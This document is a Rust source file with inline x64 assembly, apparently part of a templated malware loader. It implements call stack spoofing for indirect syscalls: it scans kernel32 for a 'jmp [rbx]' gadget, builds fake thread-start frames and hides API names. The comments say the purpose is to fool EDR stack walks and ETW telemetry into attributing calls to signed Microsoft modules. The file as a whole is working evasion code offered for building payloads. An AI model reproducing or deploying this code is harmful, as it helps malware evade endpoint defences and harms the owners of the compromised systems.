// Call stack spoofing for the indirect-syscall templates (sysCRT, sysFIBER).
//
// Kernel-side telemetry (ETW-Ti, kernel callbacks) captures the calling
// thread's stack at syscall entry and EDRs walk it: the innermost return
// address attributes the call to the loader binary. This fragment swaps that
// return address for a `jmp [rbx]` gadget inside kernel32, then chains two
// synthetic thread-start frames (kernel32!BaseThreadInitThunk+0x14 and
// ntdll!RtlUserThreadStart+0x21) so the walk terminates like a normal
// thread, attributed to signed Microsoft modules instead of the loader.
//
// Every failure path degrades silently to a plain indirect syscall: missing
// gadget, unparsable frame sizes, or CET enabled in the process (the
// replaced return address would violate the hardware shadow stack).

use core::arch::global_asm;
use core::sync::atomic::{AtomicU64, Ordering};

const RP_SPOOF_KEY: u8 = {{API_KEY}};

const RP_OBF_BTIT: &[u8] = &{{OBF_BASE_THREAD_INIT_THUNK}};
const RP_OBF_RUTS: &[u8] = &{{OBF_RTL_USER_THREAD_START}};
const RP_OBF_CET: &[u8] = &{{OBF_IS_PROCESS_CET_ENABLED}};

const RP_STACK_SHIFT: u64 = 0x400;
const RP_MIN_GADGET_FRAME: u64 = 0x68;
const RP_MAX_GADGET_FRAME: u64 = 0x300;

#[repr(C)]
struct RpSpoofState {
    gadget: u64,
    fake1: u64,
    fake2: u64,
    off1: u64,
    off2: u64,
}

static RP_SPOOF_STATE: AtomicU64 = AtomicU64::new(0);

#[link(name = "kernel32")]
extern "system" {
    #[link_name = "GetModuleHandleA"]
    fn rp_get_module_handle_spoof(name: *const u8) -> isize;
}

global_asm!(
    ".globl rp_spoof_stub",
    ".globl rp_spoof_fixup",
    // rcx = ssn, rdx = syscall instruction address in ntdll,
    // r8 = argument count, r9 = state, [rsp+0x28] = argument array.
    "rp_spoof_stub:",
    "    movzx ecx, cx",
    "    mov  r11, rsp",
    "    sub  r11, 0x400",
    "    lea  rax, [rip + rp_spoof_fixup]",
    "    mov  [r11-0x60], rax",
    "    mov  [r11-0x58], rbx",
    "    mov  [r11-0x50], rsi",
    "    mov  [r11-0x48], rdi",
    "    mov  [r11-0x40], rsp",
    "    mov  rax, [rsp]",
    "    mov  [r11-0x38], rax",
    "    mov  [r11-0x30], rcx",
    "    mov  [r11-0x28], rdx",
    "    mov  [r11-0x20], r8",
    "    mov  [r11-0x18], r9",
    "    mov  rax, [rsp+0x28]",
    "    mov  [r11-0x10], rax",
    "    lea  rbx, [r11-0x60]",
    "    mov  rax, [r9]",
    "    mov  [r11], rax",
    // Copy stack arguments (arg5+) into the syscall stack layout.
    "    mov  rsi, [rsp+0x28]",
    "    add  rsi, 0x20",
    "    lea  rdi, [r11+0x28]",
    "    mov  rcx, r8",
    "    sub  rcx, 4",
    "    jbe  2f",
    "    rep movsq",
    "2:",
    // Chain the synthetic thread-start frames above the gadget frame.
    "    mov  rsi, [r11-0x18]",
    "    mov  rcx, [rsi+0x18]",
    "    mov  rax, [rsi+0x08]",
    "    mov  [r11+rcx], rax",
    "    mov  rcx, [rsi+0x20]",
    "    mov  rax, [rsi+0x10]",
    "    mov  [r11+rcx], rax",
    // Final register state expected by the kernel at the syscall.
    "    mov  rsi, [r11-0x10]",
    "    mov  r10, [rsi]",
    "    mov  rdx, [rsi+0x08]",
    "    mov  r8,  [rsi+0x10]",
    "    mov  r9,  [rsi+0x18]",
    "    mov  eax, [r11-0x30]",
    "    mov  rcx, [r11-0x28]",
    "    mov  rsp, r11",
    "    jmp  rcx",
    // Reached through the gadget: restore the loader and resume where the
    // syscall would normally have returned, preserving rax (NTSTATUS).
    "rp_spoof_fixup:",
    "    mov  r11, [rbx+0x28]",
    "    mov  rsi, [rbx+0x10]",
    "    mov  rdi, [rbx+0x18]",
    "    mov  rsp, [rbx+0x20]",
    "    mov  rbx, [rbx+0x08]",
    "    jmp  r11",
);

extern "C" {
    fn rp_spoof_stub(
        ssn: u16,
        syscall_addr: u64,
        arg_count: u64,
        state: *const RpSpoofState,
        args: *const u64,
    ) -> i32;
}

fn rp_read_u32(base: *const u8, offset: usize) -> u32 {
    let mut bytes = [0u8; 4];
    unsafe { std::ptr::copy_nonoverlapping(base.add(offset), bytes.as_mut_ptr(), 4) };
    u32::from_le_bytes(bytes)
}

fn rp_read_u16(base: *const u8, offset: usize) -> u16 {
    let mut bytes = [0u8; 2];
    unsafe { std::ptr::copy_nonoverlapping(base.add(offset), bytes.as_mut_ptr(), 2) };
    u16::from_le_bytes(bytes)
}

unsafe fn rp_module_base(name: &str) -> *mut u8 {
    let cname = std::ffi::CString::new(name).unwrap_or_default();
    let handle = rp_get_module_handle_spoof(cname.as_ptr() as *const u8);
    if handle == 0 {
        std::ptr::null_mut()
    } else {
        handle as *mut u8
    }
}

struct RpRegion {
    rva: u32,
    size: u32,
}

fn rp_nt_headers(base: *const u8) -> Option<*const u8> {
    if base.is_null() || rp_read_u16(base, 0) != 0x5A4D {
        return None;
    }
    let nt = unsafe { base.add(rp_read_u32(base, 0x3C) as usize) };
    if rp_read_u32(nt, 0) != 0x0000_4550 || rp_read_u16(nt, 24) != 0x20B {
        return None;
    }
    Some(nt)
}

fn rp_data_dir(base: *const u8, index: usize) -> Option<RpRegion> {
    let nt = rp_nt_headers(base)?;
    let offset = 136 + index * 8;
    Some(RpRegion {
        rva: rp_read_u32(nt, offset),
        size: rp_read_u32(nt, offset + 4),
    })
}

fn rp_section(base: *const u8, name: &[u8; 8]) -> Option<RpRegion> {
    let nt = rp_nt_headers(base)?;
    let count = rp_read_u16(nt, 6) as usize;
    let first = 24 + rp_read_u16(nt, 20) as usize;
    for i in 0..count {
        let section = unsafe { nt.add(first + i * 40) };
        let raw_name = unsafe { std::slice::from_raw_parts(section, 8) };
        if raw_name == &name[..] {
            return Some(RpRegion {
                rva: rp_read_u32(section, 12),
                size: rp_read_u32(section, 8),
            });
        }
    }
    None
}

fn rp_find_runtime_function(
    base: *const u8,
    pdata: &RpRegion,
    target_rva: u32,
) -> Option<(u32, u32)> {
    if pdata.rva == 0 || pdata.size == 0 {
        return None;
    }
    let count = pdata.size as usize / 12;
    let table = unsafe { base.add(pdata.rva as usize) };
    for i in 0..count {
        let entry = unsafe { table.add(i * 12) };
        let begin = rp_read_u32(entry, 0);
        if begin > target_rva {
            break;
        }
        if target_rva < rp_read_u32(entry, 4) {
            return Some((begin, rp_read_u32(entry, 8)));
        }
    }
    None
}

// Sum the prologue stack allocations of the function containing target_va,
// the way the kernel unwinder advances past a return address. Returns None
// for functions using frame pointers, epilog markers or allocation opcodes
// whose encoding is ambiguous across unwind versions: a wrong size would
// misplace the whole synthetic chain.
fn rp_frame_size(base: *const u8, pdata: &RpRegion, target_va: u64) -> Option<u64> {
    let target_rva = target_va.checked_sub(base as u64)? as u32;
    let (begin, unwind_rva) = rp_find_runtime_function(base, pdata, target_rva)?;
    let info = unsafe { base.add(unwind_rva as usize) };
    let version = unsafe { *info } & 0x07;
    if version != 1 && version != 2 {
        return None;
    }
    let prologue = unsafe { *info.add(1) } as usize;
    let count = unsafe { *info.add(2) } as usize;
    if unsafe { *info.add(3) } & 0x0F != 0 {
        return None;
    }
    let offset = (target_rva - begin) as usize;
    if offset <= prologue {
        return None;
    }
    let codes = unsafe { info.add(4) };
    let mut size: u64 = 0;
    let mut i = 0;
    while i < count {
        let byte = unsafe { *codes.add(i * 2 + 1) };
        let op = byte & 0x0F;
        let op_info = (byte >> 4) as u64;
        match op {
            0 => {
                size += 8;
                i += 1;
            }
            2 => {
                size += (op_info + 1) * 8;
                i += 1;
            }
            4 | 8 => i += 2,
            5 | 9 => i += 3,
            _ => return None,
        }
    }
    Some(size)
}

// Collect `jmp [rbx]` (FF 23) sites in .text whose function frame is large
// enough to clear the syscall stack arguments (up to arg11 at +0x58) yet
// small enough to fit inside the synthetic stack region.
fn rp_collect_gadgets(base: *const u8, text: &RpRegion, pdata: &RpRegion) -> Vec<(u64, u64)> {
    let mut gadgets = Vec::new();
    let bytes = unsafe { std::slice::from_raw_parts(base.add(text.rva as usize), text.size as usize) };
    for i in 0..bytes.len().saturating_sub(1) {
        if bytes[i] != 0xFF || bytes[i + 1] != 0x23 {
            continue;
        }
        let candidate = base as u64 + text.rva as u64 + i as u64;
        let Some(size) = rp_frame_size(base, pdata, candidate) else { continue };
        if (RP_MIN_GADGET_FRAME..=RP_MAX_GADGET_FRAME).contains(&size) {
            gadgets.push((candidate, size));
            if gadgets.len() >= 128 {
                break;
            }
        }
    }
    gadgets
}

// Pick one candidate per process from ASLR jitter so repeated builds and
// runs do not settle on a stable, signatureable gadget address.
fn rp_pick_gadget(gadgets: &[(u64, u64)]) -> Option<(u64, u64)> {
    if gadgets.is_empty() {
        return None;
    }
    let jitter = (gadgets.as_ptr() as u64) & 0xFF;
    Some(gadgets[(jitter % gadgets.len() as u64) as usize])
}

unsafe fn rp_cet_enabled() -> bool {
    let addr = common::resolve_nt_api_address(RP_OBF_CET, RP_SPOOF_KEY);
    if addr.is_null() {
        return false;
    }
    let check: unsafe extern "system" fn() -> u8 = std::mem::transmute(addr);
    check() != 0
}

// Resolve everything needed for the spoofed stub; None means "stay on plain
// syscalls". Frame sizes double as range checks: the +0x14 / +0x21 offsets
// must land inside their functions and past their prologues.
unsafe fn rp_build_state() -> Option<RpSpoofState> {
    let kernel32 = rp_module_base(&lc!("kernel32"));
    let ntdll = rp_module_base(&lc!("ntdll"));
    if kernel32.is_null() || ntdll.is_null() {
        return None;
    }
    let text = rp_section(kernel32, b".text\0\0\0")?;
    let pdata = rp_data_dir(kernel32, 3)?;
    let pdata_nt = rp_data_dir(ntdll, 3)?;
    let (gadget, xg) = rp_pick_gadget(&rp_collect_gadgets(kernel32, &text, &pdata))?;
    let btit = common::resolve_kernel32_api_address(RP_OBF_BTIT, RP_SPOOF_KEY) as u64;
    let ruts = common::resolve_nt_api_address(RP_OBF_RUTS, RP_SPOOF_KEY) as u64;
    if btit == 0 || ruts == 0 {
        return None;
    }
    let xb = rp_frame_size(kernel32, &pdata, btit + 0x14)?;
    rp_frame_size(ntdll, &pdata_nt, ruts + 0x21)?;
    Some(RpSpoofState {
        gadget,
        fake1: btit + 0x14,
        fake2: ruts + 0x21,
        off1: 8 + xg,
        off2: 16 + xg + xb,
    })
}

pub unsafe fn rp_init_stack_spoof() {
    if rp_cet_enabled() {
        return;
    }
    let Some(state) = rp_build_state() else { return };
    let leaked = Box::leak(Box::new(state));
    RP_SPOOF_STATE.store(leaked as *mut RpSpoofState as u64, Ordering::Relaxed);
}

// Argument conversion for the fixed [u64; 12] array the stub consumes.
trait RpSysArg {
    fn rp_arg_value(self) -> u64;
}

impl RpSysArg for u8 {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for u16 {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for u32 {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for u64 {
    fn rp_arg_value(self) -> u64 { self }
}
impl RpSysArg for usize {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for i32 {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for i64 {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl RpSysArg for isize {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl<T> RpSysArg for *const T {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl<T> RpSysArg for *mut T {
    fn rp_arg_value(self) -> u64 { self as u64 }
}
impl<T> RpSysArg for &T {
    fn rp_arg_value(self) -> u64 { (self as *const T) as u64 }
}
impl<T> RpSysArg for &mut T {
    fn rp_arg_value(self) -> u64 { (self as *mut T) as u64 }
}

/// Drop-in replacement for `syscall!` that routes the call through the
/// spoofed stub when spoofing initialised, and falls back to a plain
/// indirect syscall otherwise.
#[macro_export]
macro_rules! spoofed_syscall {
    ($function_name:expr, $($argument:expr),+) => {{
        let state = RP_SPOOF_STATE.load(Ordering::Relaxed) as *const RpSpoofState;
        let (ssn, syscall_addr) =
            rust_syscalls::syscall_resolve::get_ssn(rust_syscalls::obf!($function_name));
        let mut count: u64 = 0;
        let mut args = [0u64; 12];
        $( args[count as usize] = RpSysArg::rp_arg_value($argument); count += 1; )+
        if state.is_null() || count > 12 {
            syscall!($function_name, $($argument),+)
        } else {
            rp_spoof_stub(ssn, syscall_addr, count, state, args.as_ptr())
        }
    }};
}
